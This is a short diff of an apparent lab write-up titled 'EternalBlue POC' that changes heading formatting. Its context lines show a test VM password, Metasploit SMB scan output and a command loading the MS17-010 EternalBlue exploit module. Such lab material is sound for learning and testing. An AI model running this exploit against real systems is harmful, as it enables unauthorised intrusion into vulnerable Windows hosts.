@@ -1,6 +1,6 @@
 # EternalBlue POC
 
-## Setup
+## Setup
 
 Latest Win10 VM from [here](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/):
 Password (qwerty/azerty) : Pqsszàrd1/Passw0rd!
@@ -77,7 +77,7 @@ msf6 auxiliary(scanner/smb/smb_version) > run
 [*] Auxiliary module execution completed
 ```
 
-## Exploitation
+## Exploitation
 
 ```bash
 msf6 > use exploit/windows/smb/ms17_010_eternalblue                  
